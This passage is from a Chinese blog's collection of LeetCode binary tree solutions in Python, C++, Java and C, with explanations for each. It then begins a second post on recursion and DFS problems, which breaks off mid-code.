find the maximum path sum. The path may start and end at any node in the tree. For example: Given the below binary tree, 123 1 &#x2F; \\2 3 Return 6. 题目地址：leetcode Binary Tree Maximum Path Sum 题意：给定一棵二叉树，要求返回其路径中和最大值。（可以从任意起点开始到任意起点结束） 思路：DFS,设dfs(root)返回的是包括root这个结点的单一路径上的最大值。设L=dfs(root.left) ,R=dfs(root.right)如题目样例中的{1,2,3,}就是L=2,R=3 则可能的结果有： L+R+root.val (左右子树和根构成路径为最大值，就是题目的情况） max(L,R) + root.val(左或者右子树和根构成最大值） root.val本身为最大值 和全局变量ans比较更新即可。 需要注意的是dfs返回值，可能是 max(L,R) + root.val 某一条路径 root.val 只是该结点（下面都是负的了） Python 12345678910111213141516class Solution: # @param root, a tree node # @return an integer def maxPathSum(self, root): if not root:return 0 self.INF,self.ans=-0x7ffffff,-0x7ffffff self.dfs(root) return self.ans def dfs(self,root): if not root:return self.INF L , R = self.dfs(root.left) ,self.dfs(root.right) if L + R + root.val &gt; self.ans: self.ans= L + R + root.val if max(L,R) + root.val&gt; self.ans: self.ans= max(L,R)+ root.val if root.val &gt; self.ans: self.ans=root.val return max(max(L,R) + root.val,root.val) 129. Sum Root to Leaf Numbers Given a binary tree containing digits from 0-9 only, each root-to-leaf path could represent a number. An example is the root-to-leaf path 1-&gt;2-&gt;3 which represents the number 123. Find the total sum of all root-to-leaf numbers. For example, 1234 1 &#x2F; \\2 3 The root-to-leaf path 1-&gt;2 represents the number 12. The root-to-leaf path 1-&gt;3 represents the number 13. Return the sum = 12 + 13 = 25. 题目地址：leetcode 129 Sum Root to Leaf Numbers 题意：给定一棵仅由数字0~9组成的二叉树，求根到叶子结点各个路径数字组成的字符串之和 思路：继续DFS Python 1234567891011121314151617181920class Solution(object): def sumNumbers(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: int &quot;&quot;&quot; ans = [0] self.dfs(root, 0, ans) return ans[0] def dfs(self, root, cur, ans): if not root: return if not root.left and not root.right: ans[0] += cur * 10 + root.val else: if root.left: self.dfs(root.left, cur * 10 + root.val, ans) if root.right: self.dfs(root.right, cur * 10 + root.val, ans) C++ 1234567891011121314151617181920class Solution &#123; void dfs(TreeNode *root, int cur, int &amp;ans)&#123; if(!root) return; if(!root-&gt;left &amp;&amp; !root-&gt;right)&#123; ans += cur * 10 + root-&gt;val; return; &#125; if(root-&gt;left) dfs(root-&gt;left, cur * 10 + root-&gt;val, ans); if(root-&gt;right) dfs(root-&gt;right, cur * 10 + root-&gt;val, ans); &#125; public: int sumNumbers(TreeNode* root) &#123; int ans = 0; dfs(root, 0, ans); return ans; &#125;&#125;; 144. Binary Tree Preorder Traversal Given a binary tree, return the preorder traversal of its nodes' values. For example: Given binary tree &#123;1,#,2,3&#125;, 1234561 \\ 2 &#x2F;3 return [1,2,3]. Note: Recursive solution is trivial, could you do it iteratively? 题目地址：leetcode Binary Tree Preorder Traversal 题意：给定二叉树，返回其前序遍历 思路： 直接递归。没难度。 用栈，记得应先右子树入栈。（why?递归的时候是先左子树的，而栈后进先出，故左子树要放后面入栈） 递归版 C++ 123456789101112131415class Solution &#123; void dfs(TreeNode *root, vector&lt;int&gt; &amp;ans)&#123; if(!root) return; ans.push_back(root-&gt;val); dfs(root-&gt;left, ans); dfs(root-&gt;right, ans); &#125; public: vector&lt;int&gt; preorderTraversal(TreeNode* root) &#123; vector&lt;int&gt; ans; dfs(root, ans); return ans; &#125;&#125;; Python 12345678910111213class Solution: # @param root, a tree node # @return a list of integers def preorderTraversal(self, root): ans = [] self.dfs(root,ans) return ans def dfs(self,root,ans): if not root: return ans.append(root.val) self.dfs(root.left,ans) self.dfs(root.right,ans) 迭代版 C++ 1234567891011121314151617class Solution &#123;public: vector&lt;int&gt; preorderTraversal(TreeNode* root) &#123; vector&lt;int&gt; ans; if(!root) return ans; stack&lt;TreeNode *&gt; q; q.push(root); while(!q.empty())&#123; TreeNode *cur = q.top(); q.pop(); ans.push_back(cur-&gt;val); if(cur-&gt;right) q.push(cur-&gt;right); if(cur-&gt;left) q.push(cur-&gt;left); &#125; return ans; &#125;&#125;; Python 12345678910111213class Solution: # @param root, a tree node # @return a list of integers def preorderTraversal(self, root): if not root: return [] ans, q = [],[] q.append(root) while q: cur=q.pop() if cur.right: q.append(cur.right) if cur.left: q.append(cur.left) ans.append(cur.val) return ans 145. Binary Tree Postorder Traversal Given a binary tree, return the postorder traversal of its nodes' values. For example: Given binary tree &#123;1,#,2,3&#125;, 1234561 \\ 2 &#x2F;3 return [3,2,1]. Note: Recursive solution is trivial, could you do it iteratively? 题目地址：leetcode Binary Tree Postorder Traversal 题意：给定二叉树，返回其后序遍历 思路：递归就不说了。说说非递归版本。 我们做过，从前序和中序遍历构造出树，也做过从后序和中序遍历构造树的（见105和106题） 做完前序和中序的那时候我就想，前序和后序能否直接倒序得到？（想偷懒） 答案是否定的，我们来看看前序遍历：根-左子树-右子树 后序遍历：左子树-右子树-根 把前序遍历倒过来：右子树-左子树-根 ！左右子树相反，不能直接倒！ 但是这题，哼哼哼，先左子树入栈，在右子树入栈！(和前序遍历相反，也就是颠倒了左右子树），最后输出颠倒一下即可！ 非递归版本 C++ 123456789101112131415161718class Solution &#123;public: vector&lt;int&gt; postorderTraversal(TreeNode* root) &#123; vector&lt;int&gt; ans; if(!root) return ans; stack&lt;TreeNode *&gt; q; q.push(root); while(!q.empty())&#123; TreeNode *cur = q.top(); q.pop(); ans.push_back(cur-&gt;val); if(cur-&gt;left) q.push(cur-&gt;left); if(cur-&gt;right) q.push(cur-&gt;right); &#125; reverse(ans.begin(), ans.end()); return ans; &#125;&#125;; Python 12345678910111213class Solution: # @param root, a tree node # @return a list of integers def postorderTraversal(self, root): if not root: return [] ans,q=[],[] q.append(root) while q: cur=q.pop() if cur.left: q.append(cur.left) if cur.right: q.append(cur.right) ans.append(cur.val) return ans[::-1] 递归版本 123456789101112131415class Solution &#123; void dfs(TreeNode *root, vector&lt;int&gt; &amp;ans)&#123; if(!root) return; dfs(root-&gt;left, ans); dfs(root-&gt;right, ans); ans.push_back(root-&gt;val); &#125; public: vector&lt;int&gt; postorderTraversal(TreeNode* root) &#123; vector&lt;int&gt; ans; dfs(root, ans); return ans; &#125;&#125;; 173. Binary Search Tree Iterator Implement an iterator over a binary search tree (BST). Your iterator will be initialized with the root node of a BST. Calling next() will return the next smallest number in the BST. Note: next() and hasNext() should run in average O(1) time and uses O(h) memory, where h is the height of the tree. leetcode 173 Binary Search Tree Iterator 题目：写一个二叉搜索树（BST），要求实现hasnext和next函数。调用时会这么调用：while i.hasNext(): v.append(i.next()) 思路:我们知道中序遍历结果就是有序的序列。只要用非递归的实现中序遍历即可。（见94题） Python 123456789101112131415161718192021class BSTIterator: # @param root, a binary search tree&#x27;s root node def __init__(self, root): self.q=[] self.allLeftIntoStack(root) # @return a boolean, whether we have a next smallest number def hasNext(self): if not self.q:return False return True # @return an integer, the next smallest number def next(self): cur = self.q.pop() self.allLeftIntoStack(cur.right) return cur.val def allLeftIntoStack(self,root): while root: self.q.append(root) root=root.left 199. Binary Tree Right Side View Given a binary tree, imagine yourself standing on the right side of it, return the values of the nodes you can see ordered from top to bottom. For example: Given the following binary tree, 12345 1 ---1 &#x2F; \\2 3 ---3 \\ \\ 5 4 ---4 You should return [1, 3, 4]. 题目地址：leetcode 199 Binary Tree Right Side View 题目：给定一颗二叉树，求每一层最右边的结点。 思路: 两种方法，我用的是DFS BFS，直接求得每一层最右边的，很好理解，我就不想写了。 DFS：先求深度，然后dfs，每次将找到的放在相应的层上。由于右面放的一定是右边的结点，所以能保证正确。 1234567891011121314151617class Solution: # @param root, a tree node # @return a list of integers def rightSideView(self, root): ans=[0] * self.depth(0,root) self.dfs(0,root,ans) return ans def depth(self,cur,root): if not root:return cur return max(self.depth(cur+1,root.left),self.depth(cur+1,root.right)) def dfs(self,cur,root,ans): if not root:return ans[cur]=root.val self.dfs(cur+1,root.left,ans) self.dfs(cur+1,root.right,ans) 222. Count Complete Tree Nodes Given a complete binary tree, count the number of nodes. Definition of a complete binary tree from Wikipedia: In a complete binary tree every level, except possibly the last, is completely filled, and all nodes in the last level are as far left as possible. It can have between 1 and 2hnodes inclusive at the last level h. 题目地址：leetcode 222 Count Complete Tree Nodes 题意：给定一个完全二叉树（它的所有非叶子结点都有左和右子结点），求它的结点数 思路: 直接深搜O(n) TLE了。所以采用别的方法。 对于一个结点，计算其左子树和右子树的高度。如果相等，那么为满二叉树，结点数为2^h -1 否则递归计算 C 12345678int countNodes(struct TreeNode* root) &#123; if(!root) return 0; int depth_left =0, depth_right =0; for(struct TreeNode* left = root;left;left=left-&gt;left) depth_left++; for(struct TreeNode* right = root;right;right=right-&gt;right) depth_right++; if(depth_left == depth_right) return (1&lt;&lt;depth_left) -1; return countNodes(root-&gt;left) + countNodes(root-&gt;right) + 1;&#125; Python 1234567891011class Solution: # @param &#123;TreeNode&#125; root # @return &#123;integer&#125; def countNodes(self, root): if not root : return 0 depth_left = depth_right = 0 left = right = root while left : left , depth_left = left.left,depth_left+1 while right : right , depth_right = right.right,depth_right+1 if depth_left == depth_right : return (1&lt;&lt;depth_left)-1 return self.countNodes(root.left) + self.countNodes(root.right) + 1 226. Invert Binary Tree Invert a binary tree. 12345 4 &#x2F; \\ 2 7 &#x2F; \\ &#x2F; \\1 3 6 9 to 12345 4 &#x2F; \\ 7 2 &#x2F; \\ &#x2F; \\9 6 3 1 题目地址：leetcode 226 Invert Binary Tree 题意：给定一个二叉树，让你把它倒过来 思路：DFS的时候交换左右结点即可 12345678910111213class Solution: # @param &#123;TreeNode&#125; root # @return &#123;TreeNode&#125; def invertTree(self, root): def dfs(root): if not root : return dfs(root.left) dfs(root.right) t = root.left root.left = root.right root.right = t dfs(root) return root C++ 12345678910class Solution &#123;public: TreeNode* invertTree(TreeNode* root) &#123; if (!root) return root; std::swap(root-&gt;left, root-&gt;right); invertTree(root-&gt;left); invertTree(root-&gt;right); return root; &#125;&#125;; 230. Kth Smallest Element in a BST Given a binary search tree, write a function kthSmallest to find the kth smallest element in it. Note: You may assume k is always valid, 1 ≤ k ≤ BST's total elements. Follow up: What if the BST is modified (insert/delete operations) often and you need to find the kth smallest frequently? How would you optimize the kthSmallest routine? 题目地址：leetcode 230 Kth Smallest Element in a BST 题意：给定BST，求BST中第k小的元素 思路: BST中序遍历为有序，所以直接中序遍历即可。 1234567891011121314class Solution: # @param &#123;TreeNode&#125; root # @param &#123;integer&#125; k # @return &#123;integer&#125; def kthSmallest(self, root, k): ans = [] def dfs(root): if not root : return; dfs(root.left) ans.append(root.val) if len(ans) == k: return; dfs(root.right) dfs(root) return ans[k-1] 235. Lowest Common Ancestor of a Binary Search Tree Given a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST. According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).” 12345678 _______6______ &#x2F; \\ ___2__ ___8__&#x2F; \\ &#x2F; \\0 _4 7 9 &#x2F; \\ 3 5 For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition. 题目地址：Lowest 235 Common Ancestor of a Binary Search Tree 题意：给定一颗二叉搜索树，求最近公共祖先(LCA) 思路： LCA问题可以见我博客 二叉树最近公共祖先详解（LCA问题详解） 12345678910111213class Solution(object): def lowestCommonAncestor(self, root, p, q): &quot;&quot;&quot; :type root: TreeNode :type p: TreeNode :type q: TreeNode :rtype: TreeNode &quot;&quot;&quot; if not root:return root; if p.val &gt; q.val:return self.lowestCommonAncestor(root, q, p) if root.val &gt;= p.val and root.val &lt;= q.val: return root; if root.val &lt; p.val:return self.lowestCommonAncestor(root.right, p, q) if root.val &gt; q.val:return self.lowestCommonAncestor(root.left, p, q) 236. Lowest Common Ancestor of a Binary Tree Given a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree. According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).” 12345678 _______3______ &#x2F; \\ ___5__ ___1__&#x2F; \\ &#x2F; \\6 _2 0 8 &#x2F; \\ 7 4 For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition. 题目地址：leetcode 236 Lowest Common Ancestor of a Binary Tree 题意：给定一颗二叉树，求最近公共祖先(LCA) 思路： LCA问题可以见我博客 二叉树最近公共祖先详解（LCA问题详解） Python 1234567891011121314class Solution(object): def lowestCommonAncestor(self, root, p, q): &quot;&quot;&quot; :type root: TreeNode :type p: TreeNode :type q: TreeNode :rtype: TreeNode &quot;&quot;&quot; if not root or root == p or root == q: return root left = self.lowestCommonAncestor(root.left, p, q) right = self.lowestCommonAncestor(root.right, p, q) if left and right: return root return left if left else right 257. Binary Tree Paths Given a binary tree, return all root-to-leaf paths. For example, given the following binary tree: 123456 1 &#x2F; \\2 3 \\ 5 All root-to-leaf paths are: 1[&quot;1-&gt;2-&gt;5&quot;, &quot;1-&gt;3&quot;] 题目地址：leetcode Binary Tree Paths 题意：给定一棵二叉树，求它所有从根节点到叶子结点的路径。 思路：DFS。。。。。 1234567891011121314151617class Solution: # @param &#123;TreeNode&#125; root # @return &#123;string[]&#125; def binaryTreePaths(self, root): if not root: return [] ans = [] self.dfs(root, ans, str(root.val)) return ans def dfs(self, root, ans, cur): if root.left: self.dfs(root.left, ans, cur + &quot;-&gt;&quot; + str(root.left.val)) if root.right: self.dfs(root.right, ans, cur + &quot;-&gt;&quot; + str(root.right.val)) if not root.left and not root.right: ans.append(cur) 297. Serialize and Deserialize Binary Tree Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment. Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure. For example, you may serialize the following tree 12345 1 &#x2F; \\2 3 &#x2F; \\ 4 5 as \"[1,2,3,null,null,4,5]\", just the same as how LeetCode OJ serializes a binary tree. You do not necessarily need to follow this format, so please be creative and come up with different approaches yourself. Note: Do not use class member/global/static variables to store states. Your serialize and deserialize algorithms should be stateless. 题目地址：leetcode 297 Serialize and Deserialize Binary Tree 题意：给定根节点，将树进行序列化为字符串，然后反序列化回来。 思路: 方法一： 采用和leetcode的序列化方法一样的。 BFS： 对于序列化，只需要首先将根放入队列，然后每次从队列取第一个cur。如果cur为空，输出\"null,\"，否则输出cur-&gt;val + \",\"。这里我用都好分隔符 对于反序列化，按分隔符\",\"分割，每次取出。如果当前字符串t不为\"null\",则创建一个值为t的TreeNode，把当前结点的left或者right指向它。详见代码。 C++ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class Codec &#123;public: // Encodes a tree to a single string. string serialize(TreeNode* root) &#123; if (!root) return &quot;&quot;; string res; queue&lt;TreeNode*&gt; q; q.push(root); while (!q.empty()) &#123; TreeNode *cur = q.front(); q.pop(); if (!cur) res.append(&quot;null,&quot;); else &#123; res.append(to_string(cur-&gt;val) + &quot;,&quot;); q.push(cur-&gt;left); q.push(cur-&gt;right); &#125; &#125; return res.substr(0, res.size() - 1); &#125; // Decodes your encoded data to tree. TreeNode* deserialize(string data) &#123; if (data.empty()) return nullptr; queue&lt;TreeNode*&gt; q; TreeNode *root = nullptr, *cur = nullptr; bool isLeft = true; for (string::iterator s = data.begin(), e; s != data.end(); s = e != data.end() ? next(e) : data.end()) &#123; e = find(s, data.end(), &#x27;,&#x27;); string sub = string(s, e); TreeNode *t = nullptr; if (sub != &quot;null&quot;) &#123; t = new TreeNode(stoi(sub)); q.push(t); &#125; if (root == nullptr) &#123; root = cur = t; if (q.empty()) return root; q.pop(); &#125; else &#123; if (isLeft) cur-&gt;left = t; else &#123; cur-&gt;right = t; if (q.empty()) return root; cur = q.front(); q.pop(); &#125; isLeft = !isLeft; &#125; &#125; return root; &#125;&#125;; Java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class Codec &#123; // Encodes a tree to a single string. public String serialize(TreeNode root) &#123; if (root == null) return &quot;&quot;; LinkedList&lt;TreeNode&gt; q = new LinkedList&lt;&gt;(); q.add(root); StringBuilder res = new StringBuilder(); while (!q.isEmpty()) &#123; TreeNode cur = q.pollFirst(); if (cur != null) &#123; q.add(cur.left); q.add(cur.right); res.append(cur.val); &#125; else res.append(&quot;null&quot;); res.append(&#x27;,&#x27;); &#125; res.deleteCharAt(res.length()-1); return res.toString(); &#125; // Decodes your encoded data to tree. public TreeNode deserialize(String data) &#123; if (data.isEmpty()) return null; LinkedList&lt;TreeNode&gt; q = new LinkedList&lt;&gt;(); TreeNode root = null, cur = null; boolean isLeft = true; for (String s : data.split(&quot;,&quot;)) &#123; TreeNode t = null; if (!s.equals(&quot;null&quot;)) &#123; t = new TreeNode(Integer.parseInt(s)); q.add(t); &#125; if (root == null) &#123; cur = root = q.pollFirst(); &#125; else &#123; if (isLeft) cur.left = t; else &#123; cur.right = t; cur = q.pollFirst(); &#125; isLeft = !isLeft; &#125; &#125; return root; &#125;&#125; Python 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class Codec: def serialize(self, root): &quot;&quot;&quot;Encodes a tree to a single string. :type root: TreeNode :rtype: str &quot;&quot;&quot; if not root: return &quot;&quot; q = collections.deque([root]) res = [] while q: cur = q.popleft() if cur: res.append(str(cur.val)) q.append(cur.left) q.append(cur.right) else: res.append(&quot;null&quot;) return &quot;,&quot;.join(res) def deserialize(self, data): &quot;&quot;&quot;Decodes your encoded data to tree. :type data: str :rtype: TreeNode &quot;&quot;&quot; if not data: return None q = collections.deque() root = cur = None is_left = True for s in data.split(&quot;,&quot;): t = None if s != &quot;null&quot;: t = TreeNode(int(s)) q.append(t) if root: if is_left: cur.left = t else: cur.right = t if not q: return root cur = q.popleft() is_left = not is_left else: if not q: return root root = cur = q.popleft() return root 另一种写法：反序列化的时候用i来维护子节点， 队列来维护当前节点。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Codec: def serialize(self, root): &quot;&quot;&quot;Encodes a tree to a single string. :type root: TreeNode :rtype: str &quot;&quot;&quot; if not root: return &quot;[]&quot; ans = [] q = deque([root]) while q: cur = q[0] q.popleft() if cur: q.append(cur.left) q.append(cur.right) ans.append(str(cur.val)) else: ans.append(&quot;null&quot;) return &#x27;[&#123;&#125;]&#x27;.format(&#x27;,&#x27;.join(ans)) def deserialize(self, data): &quot;&quot;&quot;Decodes your encoded data to tree. :type data: str :rtype: TreeNode &quot;&quot;&quot; if data == &#x27;[]&#x27;: return None data = data[1:-1].split(&#x27;,&#x27;) root = TreeNode(int(data[0])) i = 1 q = deque([root]) while q: cur = q.popleft() if i &gt;= len(data): break if data[i] != &#x27;null&#x27;: cur.left = TreeNode(int(data[i])) q.append(cur.left) i += 1 if data[i] != &#x27;null&#x27;: cur.right = TreeNode(int(data[i])) q.append(cur.right) i += 1 return root# Your Codec object will be instantiated and called as such:# codec = Codec()# codec.deserialize(codec.serialize(root)) 方法二 按前序遍历的方式建树 Java 12345678910111213141516171819202122232425262728293031323334353637public class Codec &#123; public String serialize(TreeNode root) &#123; if (root == null) return &quot;&quot;; Deque&lt;TreeNode&gt; q = new LinkedList&lt;&gt;(); q.add(root); StringBuilder res = new StringBuilder(); while (!q.isEmpty()) &#123; TreeNode cur = q.pollLast(); if (cur != null) &#123; q.add(cur.right); q.add(cur.left); res.append(cur.val); &#125; else res.append(&quot;null&quot;); res.append(&#x27;,&#x27;); &#125; res.deleteCharAt(res.length() - 1); return res.toString(); &#125; private TreeNode deserializeHelper(final Deque&lt;String&gt; q) &#123; if (q.isEmpty() ) return null; String s = q.pollFirst(); if(s.equals(&quot;null&quot;)) return null; TreeNode cur = new TreeNode(Integer.parseInt(s)); cur.left = deserializeHelper(q); cur.right = deserializeHelper(q); return cur; &#125; // Decodes your encoded data to tree. public TreeNode deserialize(String data) &#123; if (data.isEmpty()) return null; Deque&lt;String&gt; q= new LinkedList&lt;&gt;(Arrays.asList(data.split(&quot;,&quot;))); return deserializeHelper( q); &#125;&#125; 449. Serialize and Deserialize BST Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment. Design an algorithm to serialize and deserialize a binary search tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary search tree can be serialized to a string and this string can be deserialized to the original tree structure. The encoded string should be as compact as possible. Note: Do not use class member/global/static variables to store states. Your serialize and deserialize algorithms should be stateless. 题目地址：leetcode Serialize and Deserialize BST 题目大意：给定一棵BST，要求进行序列化和反序列化。要求序列化后的字符串尽可能的短。 思路： 和297. Serialize and Deserialize Binary Tree题的区别在于，这题是BST。 BST和其他的有啥用呢？在297题中，我们用null表示节点为空。但是这题不需要。我们可以根据节点的大小来判断应该在左子树还是右子树。 其实就是说BST可以直接用前序遍历恢复。而二叉树需要至少两种遍历的存储才行，不然就要加入额外的信息，如297用的null。 C++ 123456789101112131415161718192021222324252627282930313233343536373839404142class Codec &#123;public: // Encodes a tree to a single string. string serialize(TreeNode* root) &#123; if (!root) return &quot;&quot;; string res; stack&lt;TreeNode*&gt; q; q.push(root); while (!q.empty()) &#123; TreeNode *cur = q.top(); q.pop(); if (cur) &#123; q.push(cur-&gt;right); q.push(cur-&gt;left); res.append(to_string(cur-&gt;val) + &quot;,&quot;); &#125; &#125; return res.substr(0, res.size() - 1); &#125; // Decodes your encoded data to tree. TreeNode* deserialize(string data) &#123; if (data.empty()) return nullptr; queue&lt;int&gt; q; for (auto s = data.begin(), e = s; s != data.end(); s = (e != data.end() ? next(e) : data.end())) &#123; e = find(s, data.end(), &#x27;,&#x27;); q.push(stoi(string(s, e))); &#125; return buildTree(0x7fffffff, q);; &#125; private: TreeNode* buildTree(int maxV, queue&lt;int&gt; &amp;q) &#123; if (q.empty()) return nullptr; TreeNode* root = new TreeNode(q.front()); q.pop(); if (!q.empty() &amp;&amp; q.front() &lt; root-&gt;val) root-&gt;left = buildTree(root-&gt;val, q); if (!q.empty() &amp;&amp; root-&gt;val &lt; q.front() &amp;&amp; q.front() &lt; maxV) root-&gt;right = buildTree(maxV, q); return root; &#125;&#125;; Java 12345678910111213141516171819202122232425262728293031323334353637public class Codec &#123; public String serialize(TreeNode root) &#123; if (root == null) return &quot;&quot;; Deque&lt;TreeNode&gt; q = new LinkedList&lt;&gt;(); q.add(root); StringBuilder res = new StringBuilder(); while (!q.isEmpty()) &#123; TreeNode cur = q.pollLast(); if (cur != null) &#123; q.add(cur.right); q.add(cur.left); res.append(cur.val).append(&#x27;,&#x27;); &#125; &#125; res.deleteCharAt(res.length() - 1); return res.toString(); &#125; private TreeNode deserializeHelper(int max, final Deque&lt;Integer&gt; q) &#123; if (q.isEmpty()) return null; TreeNode root = new TreeNode(q.pollFirst()); if (!q.isEmpty() &amp;&amp; q.peekFirst() &lt; root.val) root.left = deserializeHelper(root.val, q); if (!q.isEmpty() &amp;&amp; q.peekFirst() &gt; root.val &amp;&amp; max &gt; q.peekFirst()) root.right = deserializeHelper(max, q); return root; &#125; // Decodes your encoded data to tree. public TreeNode deserialize(String data) &#123; if (data.isEmpty()) return null; Deque&lt;Integer&gt; q = new LinkedList&lt;&gt;(); for (String s : data.split(&quot;,&quot;)) q.add(Integer.parseInt(s)); return deserializeHelper(Integer.MAX_VALUE, q); &#125;&#125; Python 1234567891011121314151617181920212223242526272829303132333435class Codec: def serialize(self, root): &quot;&quot;&quot;Encodes a tree to a single string. :type root: TreeNode :rtype: str &quot;&quot;&quot; if not root: return &quot;&quot; q = collections.deque([root]) res = [] while q: cur = q.pop() if cur: q.append(cur.right) q.append(cur.left) res.append(str(cur.val)) return &quot;,&quot;.join(res) def deserialize(self, data): &quot;&quot;&quot;Decodes your encoded data to tree. :type data: str :rtype: TreeNode &quot;&quot;&quot; def build_tree(max_v, q): if not q: return None root = TreeNode(q.popleft()) if q and root.val &gt; q[0]: root.left = build_tree(root.val, q) if q and root.val &lt; q[0] &lt; max_v: root.right = build_tree(max_v, q) return root return build_tree(0x7fffffff, q=collections.deque(map(int, data.split(&quot;,&quot;)))) if data else None 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"『leetcode』递归/DFS","slug":"leetcode-recursive-or-dfs","date":"2015-03-01T14:30:02.000Z","updated":"2021-01-08T13:32:16.863Z","comments":true,"path":"leetcode-recursive-or-dfs/","link":"","permalink":"https://www.hrwhisper.me/leetcode-recursive-or-dfs/","excerpt":"leetcode dfs 归纳整理 包括： 17. Letter Combinations of a Phone Number 22. Generate Parentheses 39 Combination Sum 40 Combination Sum II 51 N-Queens 52 N-Queens II 77 Combinations 78 Subsets 79 Word Search 90 Subsets II 200 Number of Islands 216 Combination Sum III 241 Different Ways to Add Parentheses 282 Expression Add Operators 797. All Paths From Source to Target","text":"leetcode dfs 归纳整理 包括： 17. Letter Combinations of a Phone Number 22. Generate Parentheses 39 Combination Sum 40 Combination Sum II 51 N-Queens 52 N-Queens II 77 Combinations 78 Subsets 79 Word Search 90 Subsets II 200 Number of Islands 216 Combination Sum III 241 Different Ways to Add Parentheses 282 Expression Add Operators 797. All Paths From Source to Target 17. Letter Combinations of a Phone Number Given a digit string, return all possible letter combinations that the number could represent. A mapping of digit to letters (just like on the telephone buttons) is given below. 12**Input:**Digit string &quot;23&quot;**Output:** [&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;]. 题目地址：leetcode Letter Combinations of a Phone Number 题目大意: 给定一串由数字组成的字符串，求9宫格的手机键盘能打出的字母组合。 思路： 方法一: 直接dfs搜索 C++ 12345678910111213141516171819class Solution &#123;public: vector&lt;string&gt; letterCombinations(string digits) &#123; vector&lt;string&gt; ans; if(digits.empty()) return ans; static const vector&lt;string&gt; button = &#123;&quot;&quot;, &quot;&quot;, &quot;abc&quot;, &quot;def&quot;, &quot;ghi&quot;, &quot;jkl&quot;, &quot;mno&quot;, &quot;pqrs&quot;, &quot;tuv&quot;, &quot;wxyz&quot;&#125;; dfs(0, &quot;&quot;, ans, button, digits); return ans; &#125; void dfs(int start, string cur, vector&lt;string&gt; &amp;ans, const vector&lt;string&gt; button, const string &amp;digits)&#123; if(cur.size() == digits.size())&#123; ans.push_back(cur); return; &#125; for(char c: button[digits[start] - &#x27;0&#x27;]) dfs(start + 1, cur + c, ans, button, digits); &#125;&#125;; Python 1234567891011121314151617181920class Solution(object): def letterCombinations(self, digits): &quot;&quot;&quot; :type digits: str :rtype: List[str] &quot;&quot;&quot; if not digits: return [] button = [&#x27;&#x27;, &#x27;&#x27;, &#x27;abc&#x27;, &#x27;def&#x27;, &#x27;ghi&#x27;, &#x27;jkl&#x27;, &#x27;mno&#x27;, &#x27;pqrs&#x27;, &#x27;tuv&#x27;, &#x27;wxyz&#x27;] ans = [] self.dfs(0, &#x27;&#x27;, ans, button, digits) return ans def dfs(self, i, cur, ans, button, digits): if len(cur) == len(digits): ans.append(cur) return for c in button[int(digits[i])]: self.dfs(i + 1, cur + c, ans, button, digits) 方法二: BFS的思想。 解相当于一颗多叉树上的遍历。 digits[i - 1] 遍历完答案为ans，则下一次就是枚举ans和当前数字digits[i] 能打出的字母的组合起来。 假设ans有9种了，现在digits[i]对应的有4种，那就是9 * 4=36种。 12345678910111213141516171819class Solution &#123;public: vector&lt;string&gt; letterCombinations(string digits) &#123; vector&lt;string&gt; ans; if(digits.empty()) return ans; static const vector&lt;string&gt; button = &#123;&quot;&quot;, &quot;&quot;, &quot;abc&quot;, &quot;def&quot;, &quot;ghi&quot;, &quot;jkl&quot;, &quot;mno&quot;, &quot;pqrs&quot;, &quot;tuv&quot;, &quot;wxyz&quot;&#125;; ans.push_back(&quot;&quot;); for(int i = 0; i &lt; digits.size(); i++)&#123; vector&lt;string&gt; temp; for(char c: button[digits[i] - &#x27;0&#x27;])&#123; for(string cur: ans)&#123; temp.push_back(cur + c); &#125; &#125; ans = temp; &#125; return ans; &#125;&#125;; 22. Generate Parentheses Given n pairs of parentheses, write a function to generate all combinations of well-formed parentheses. For example, given n = 3, a solution set is: [ \"((()))\", \"(()())\", \"(())()\", \"()(())\", \"()()()\"] 题目地址：leetcode Generate Parentheses 题目大意：给定数字n，求所有可能的合法括号。 思路：递归搜索即可。。记录左边有多少个括号，总共还有个左括号没有用即可。 C++ 12345678910111213141516class Solution &#123; void dfs(int n, int left, string cur, vector&lt;string&gt; &amp; ans)&#123; if(!n &amp;&amp; !left)&#123; ans.push_back(cur); return; &#125; if(n &gt; 0) dfs(n - 1, left + 1, cur + &#x27;(&#x27;, ans); if(left &gt; 0) dfs(n, left - 1, cur + &#x27;)&#x27;, ans); &#125;public: vector&lt;string&gt; generateParenthesis(int n) &#123; vector&lt;string&gt; ans; dfs(n, 0, &quot;&quot;, ans); return ans; &#125;&#125;; Python 12345678910111213141516class Solution(object): def generateParenthesis(self, n): &quot;&quot;&quot; :type n: int :rtype: List[str] &quot;&quot;&quot; ans = [] self.dfs(n, 